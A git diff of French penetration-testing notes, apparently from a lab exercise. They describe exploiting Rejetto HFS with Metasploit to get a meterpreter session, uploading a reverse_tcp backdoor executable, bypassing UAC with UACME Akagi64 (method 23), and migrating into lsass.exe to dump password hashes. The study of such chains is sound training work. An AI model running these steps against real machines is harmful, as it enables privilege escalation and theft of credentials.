@@ -30,7 +30,7 @@ Il est possible de bypasser UAC par différents outils. Tout dépend de la versi
 * `users` Pour connaître les users de la machine  
 * `net localgroup administrators` pour connaître les membres du groupe administrators.  
 **Démarrer Metasploit** :
-* `search rejetto`, puis utiliser le module (après paramétrage des options) et on obtient facilement un meterpreter (`sysinfo` pour vérifier)  
+* `search rejetto`, puis utiliser le module (après paramétrage des options) et on obtient facilement un meterpreter, ``shell`` (`sysinfo` pour vérifier)  
 * Migrer d'un meterpreter x86 vers x64 : `pgrep explorer`, une valeur est rencoyée, puis `migrate <Number>`, nous obtenons un meterpreter x64.  
 * `getprivs` permet de voir les privilèges du user actuel.  
 * `net localgroup administrators` : Nous permet de voir les comptes membres du groupes des admins locaux.  
@@ -40,7 +40,7 @@ Il est possible de bypasser UAC par différents outils. Tout dépend de la versi
 >``windows`` : système cible
 >``meterpreter`` : shell avancé (mémoire, fichiers, processus, etc.)
 >``reverse_tcp`` : la victime initie la connexion vers toi
-> ``-f exe``
+> ``-f exe``run
 > ➡️ Format de sortie : exe = fichier exécutable Windows.
 
 * **côté attaquant**
@@ -53,10 +53,9 @@ run
 
 * Retourner sur le meterpreter : ``cd C:\\``, `mkdir Temp`, `cd Temp`, `upload backdoor.exe` (pour envoyer dans le dossier Temp, sur machine distante).
 * Envoyer Aakgi64 sur machine cible : `upload /root/Desktop/tools/UACME/Akagi64.exe`  
-* `Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe` (Akagi outil connu pour exploiter des techniques de bypass UAC sur Windows). "23" est l'ID de la méthode à lancer.    
-
-
-
+* Retourner sur le meterpreter, lancer `shell`, puis `Akagi64.exe 23 C:\Temp\backdoor.exe` (Akagi outil connu pour exploiter des techniques de bypass UAC sur Windows). "23" est l'ID de la méthode à lancer (elle dépend de la version de Windows à exploiter).    
+* Un meterpreter s'ouvre sur la machine en écoute et nous obtenons les droits Admin (on peut vérifier avec `getprivs`).  
+* `ps` pour regarder les processus actifs, puis migrer vers le processus de **lsass.exe**, puis `hasdump` pour récupérer les hashes.
 
 
 
